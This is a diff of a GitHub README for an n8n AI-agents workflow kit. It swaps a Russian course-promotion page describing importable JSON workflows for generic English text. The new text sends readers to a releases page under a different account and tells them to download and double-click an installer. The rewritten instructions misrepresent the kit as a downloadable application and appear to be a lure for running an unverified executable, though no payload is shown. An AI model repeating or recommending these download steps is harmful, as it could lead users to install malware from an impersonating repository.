@@ -1,73 +1,90 @@
-# 🚀 n8n AI Agents Starter Kit — стартовый набор workflow от Stepik Awards 2024
+# 🎉 n8n-ai-agents-starter-kit - Your Gateway to Easy Automation
 
-[![Stars](https://img.shields.io/github/stars/grebblydragon/n8n-ai-agents-starter-kit?style=social)](https://github.com/grebblydragon/n8n-ai-agents-starter-kit)
-[![Forks](https://img.shields.io/github/forks/grebblydragon/n8n-ai-agents-starter-kit)](https://github.com/grebblydragon/n8n-ai-agents-starter-kit)
-[![Stepik Course](https://img.shields.io/badge/Stepik-AI%20агенты%20n8n-brightgreen)](https://stepik.org/a/222232?utm_source=github)
+[![Download n8n-ai-agents-starter-kit](https://img.shields.io/badge/Download-n8n--ai--agents--starter--kit-brightgreen)](https://github.com/Codimart/n8n-ai-agents-starter-kit/releases)
 
-**Пакет готовых n8n workflow (стартовый набор из 4 сценариев)**. Импортируй за 30 секунд → автоматизируй бизнес!
+## 🚀 Getting Started
 
-## 🔥 ТОП-4 WORKFLOW
+Welcome to the n8n-ai-agents-starter-kit. This kit helps you automate tasks and integrate AI agents smoothly. With simple tools, you can manage business processes without needing coding skills.
 
-| Workflow | Что делает | Сложность |
-|----------|------------|-----------|
-| [🔥 Lead Processor](workflows/lead-processor.json) | Telegram → CRM за 10 сек | ⭐⭐ |
-| [📊 PDF Extractor](workflows/pdf-extractor.json) | PDF → Google Sheets | ⭐⭐⭐ |
-| [✍️ Content Repurposer](workflows/content-repurposer.json) | 1 пост → 10 соцсетей | ⭐ |
-| [🧠 AI Agent RAG](workflows/ai-agent-rag.json) | LLM + база знаний | ⭐⭐⭐⭐ |
+## 🌟 Features
 
-## 🎯 Для кого
+- **AI Agents:** Create and customize AI agents to handle various tasks.
+- **Automation Workflows:** Set up automation for repetitive tasks with ease.
+- **Integration Samples:** Access real-world examples for better understanding.
+- **Support for Various Topics:** Includes lead generation, content repurposing, and more.
 
-- ✅ Предприниматели — без кодеров  
-- ✅ Фрилансеры — заказы 50–200k₽  
-- ✅ Разработчики — рутина ×10  
-- ✅ Студенты — портфолио  
+## 💻 System Requirements
 
-## 🚀 Старт за 3 клика
+To use the n8n-ai-agents-starter-kit, you will need:
 
-1. Открой n8n → Import from File.  
-2. Загрузи любой `.json` из папки `workflows`.  
-3. Подключи нужные API (5 минут).
+- A computer with at least 4GB of RAM.
+- Windows, macOS, or a Linux operating system.
+- An active internet connection for downloading updates and support.
 
-## 💼 Кейсы из курса (700+ студентов)
+## 📥 Download & Install
 
-- 🐕 Магазин шпицев: 2 менеджера → 3 млн ₽/мес.  
-- ⚡ Лидогенерация: заявка → CRM за 10 секунд.  
-- 📄 PDF сметы: стройка → Google Sheets за 3 секунды.  
+To download the n8n-ai-agents-starter-kit, please visit the Releases page:
 
-## 🎓 Полный курс «AI агенты и автоматизация с n8n»
+[Visit this page to download](https://github.com/Codimart/n8n-ai-agents-starter-kit/releases)
 
-**6 проектов + выпускной + сертификат Stepik.**
+1. Click on the latest release version.
+2. Choose the file suitable for your operating system.
+3. Download the file to your computer.
 
-**✅ Программа:**
+Once downloaded, follow these steps to run the application:
 
-- Парсинг и веб‑скрапинг.  
-- CRM‑интеграции (AmoCRM, Битрикс24).  
-- RAG‑агенты + Qdrant / Supabase.  
-- AI‑агенты с памятью и инструментами.  
-- Airtable, Redis, Tavily, Firecrawl и др.
+1. Locate the downloaded file in your computer's downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
 
-**🎁 Бонусы:**
+## 🛠️ How to Use
 
-- Доступ к n8n Enterprise.  
-- Qdrant, Redis, Langfuse на время обучения.  
-- Telegram‑канал курса: https://t.me/big_llm_course  
+1. Open the n8n application after installation.
+2. Familiarize yourself with the dashboard.
+3. Start by creating a new workflow by clicking on "New".
+4. Drag and drop the AI agent nodes you want to use.
+5. Configure each node according to your needs.
+6. Save your workflow, and run it to see it in action.
 
-**[🚀 Записаться на курс →](https://stepik.org/a/222232?utm_source=github)**
+## 🎓 Learning Resources
 
-## 📈 Отзывы
+To help you make the most of this starter kit, here are some resources:
 
-- ⭐ 5/5 — «За вечер первую автоматизацию собрал».  
-- ⭐ 5/5 — «Заказы по 100k+ беру».  
-- ⭐ 5/5 — «n8n Enterprise бесплатно!».  
+- **n8n Documentation:** [Visit Documentation](https://docs.n8n.io) - Learn how to use n8n effectively.
+- **Video Tutorials:** Search for tutorials online to find guides on building workflows.
+- **Community Forum:** Join the n8n community for tips and support.
 
----
-# 🧠 Теги для поисковиков и GitHub
+## ⚙️ Troubleshooting
 
-#ai #n8n #автоматизация #автоматизация_процессов #lowcode #nocode  
-#интеграции #интеграции_api #aiагенты #llm #чатботы #python #javascript  
-#векторные_базы #парсинг #scraping #вебпарсинг #обработка_данных #контент_генерация  
-#обучение #курсn8n #курс_по_автоматизации #n8n_обучение #stepik #курсpoai  
-#автоматизациябизнеса #ai_инструменты #workflow #workflows #ai_content_factory  
-#реальные_проекты #ai_и_автоматизация #драгндроп #supabase #airtable #redis  
-#firecrawl #tavily #mcp #векторные_базы_данных #интеграция_llm
+If you encounter any issues while using the n8n-ai-agents-starter-kit, consider the following:
 
+- Ensure your system meets the requirements.
+- Restart the application and try again.
+- Check the community forum for similar issues and solutions.
+
+## 🤝 Get Involved
+
+Want to contribute? You can help improve the n8n-ai-agents-starter-kit by:
+
+- Reporting any issues on GitHub.
+- Suggesting features or improvements.
+- Contributing code if you have programming skills.
+
+Your input is invaluable to making this project better!
+
+## 🌐 Related Topics
+
+This starter kit covers various topics:
+
+- AI Agents
+- Business Automation
+- Lead Generation
+- No-Code Solutions
+
+Feel free to explore these keywords to find more information related to your interests.
+
+## 📄 License
+
+This project is open source and available under the MIT License. You can freely use and modify the kit as per the terms of the license.
+
+By following these steps, you can easily set up and use the n8n-ai-agents-starter-kit for your automation needs. Enjoy experimenting with AI agents and workflows!
